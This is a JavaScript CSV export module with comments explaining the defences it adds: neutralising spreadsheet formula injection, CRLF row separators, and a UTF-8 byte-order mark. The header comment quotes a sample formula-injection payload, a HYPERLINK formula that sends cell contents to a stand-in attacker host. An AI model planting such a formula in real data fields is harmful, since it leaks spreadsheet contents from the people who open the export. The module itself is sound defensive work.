/**
 * The one CSV serialiser for the whole application.
 *
 * Why this module is the only one
 * -------------------------------
 * Twenty-one hub consoles each shipped their own copy of this line:
 *
 *   const csv = rows.map((r) => r.map((c) => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\n");
 *
 * It is correct on quotes, and - because every field is quoted unconditionally - on commas and
 * newlines too. It is wrong on three other things, and the first is a security defect.
 *
 * 1. Formula injection. A spreadsheet evaluates a field beginning with `=`, `+`, `-`, `@`, a tab or
 *    a carriage return as a formula. Quoting does not prevent it: the CSV parser strips the quotes
 *    before the cell is evaluated. Every field in these exports is attacker-influenced - equipment
 *    names, patient identifiers, batch numbers, technician notes and alert bodies all come from user
 *    input or a supplier feed - so an equipment note reading
 *
 *      =HYPERLINK("https://attacker.example/?d="&A1,"Report")
 *
 *    is a live exfiltration link in the reviewing engineer's spreadsheet.
 *
 * 2. LF row separators. RFC 4180 specifies CRLF, and some Windows tooling reads an LF-only file as
 *    a single row.
 *
 * 3. No UTF-8 BOM. Excel on Windows then decodes the file as the system code page, corrupting the
 *    µ in µg/mL, the ° in °C, and every non-English name.
 *
 * A page that grows its own serialiser again silently loses all three, which is exactly how
 * twenty-one of them came to be missing them. `csv.test.js` walks `src/pages/` and fails if any
 * page starts hand-rolling one.
 */

/**
 * Characters a spreadsheet reads as the start of a formula.
 *
 * The tab and carriage return are in here because Excel strips leading whitespace before deciding
 * whether a cell is a formula, so `\t=1+1` is evaluated exactly as `=1+1` is.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * A well-formed number, including a leading sign, a bare decimal point and exponent form.
 *
 * This exemption is the reason the guard is safe to turn on everywhere. `-80` is an ultra-low
 * freezer setpoint and `-14.2` Pa is an isolation-room pressure; both appear in these exports, both
 * start with a trigger character, and neither can start a formula. Neutralising them would turn
 * them into text and break every sum in the sheet the export exists to feed.
 *
 * The match is anchored at both ends deliberately: `-80=1+1` and `+1-800-CALL` start out looking
 * numeric and are payloads, so they must not be exempt.
 */
const WELL_FORMED_NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Escapes one value into a complete, quoted CSV field.
 *
 * The result is always wrapped in quotes - unconditional quoting is what makes embedded commas and
 * newlines safe without inspecting them.
 *
 * @param {unknown} value the cell value; null and undefined become an empty field, not the text
 *   "null" or "undefined"
 * @param {{formulaSafe?: boolean}} [options] `formulaSafe: false` skips the guard, for a CSV bound
 *   for a machine parser rather than a spreadsheet
 * @returns {string} the quoted field, apostrophe-prefixed if it needed neutralising
 */
export function escapeCsvField(value, options = {}) {
  const { formulaSafe = true } = options;

  const text = value === null || value === undefined ? "" : String(value);

  // The guard has to run before quoting, not after. An earlier draft prefixed the apostrophe onto
  // the already-quoted string, which put it outside the quotes where the parser drops it.
  const guarded =
    formulaSafe && FORMULA_TRIGGERS.includes(text.charAt(0)) && !WELL_FORMED_NUMBER.test(text)
      ? `'${text}`
      : text;

  return `"${guarded.replace(/"/g, '""')}"`;
}

/**
 * Serialises a table into an RFC 4180 CSV document.
 *
 * @param {Array<Array<unknown>>} rows every row, header included
 * @param {{bom?: boolean, formulaSafe?: boolean}} [options] `bom: false` omits the UTF-8 byte order
 *   mark, for a consumer that would otherwise read it as data
 * @returns {string} the document, CRLF-separated, BOM-prefixed by default
 */
export function rowsToCsv(rows, options = {}) {
  const { bom = true, formulaSafe = true } = options;

  const body = rows
    .map((row) => row.map((cell) => escapeCsvField(cell, { formulaSafe })).join(","))
    .join("\r\n");

  // An empty table has no BOM either - a zero-byte file is a clearer signal of "nothing to export"
  // than a file containing only a byte order mark.
  if (body === "") {
    return "";
  }

  return bom ? `﻿${body}` : body;
}

/**
 * Serialises `rows` and hands the browser a download.
 *
 * @param {string} filename the name offered to the browser
 * @param {Array<Array<unknown>>} rows every row, header included
 * @param {{bom?: boolean, formulaSafe?: boolean}} [options] forwarded to `rowsToCsv`
 * @returns {number} the number of data rows written, excluding the header - so a caller can report
 *   "142 rows exported" without recounting
 */
export function downloadCsv(filename, rows, options = {}) {
  const csv = rowsToCsv(rows, options);

  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);

  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = filename;
  document.body.appendChild(anchor);
  anchor.click();
  anchor.remove();

  // Without this the blob is pinned for the life of the document, and these consoles export on
  // every tab switch.
  URL.revokeObjectURL(url);

  return Math.max(0, rows.length - 1);
}
